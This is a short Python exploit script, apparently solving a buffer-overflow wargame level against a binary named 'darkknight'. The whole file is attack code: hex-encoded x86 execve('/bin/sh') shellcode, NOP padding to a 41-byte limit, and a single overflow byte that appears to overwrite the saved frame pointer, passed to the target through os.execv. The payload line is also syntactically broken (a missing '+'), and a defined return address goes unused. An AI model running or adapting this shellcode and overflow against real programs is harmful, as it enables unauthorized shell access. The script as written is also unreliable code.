import os
from struct import *

p = lambda x : pack("<L",x)


target="/home/golem/darkknight"
ret = 0xbffff590
limit = 41

shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"


payload = shellcode+"\x90"*(limit-len(shellcode)-1)"\x8c"

os.execv(target,[target,payload])
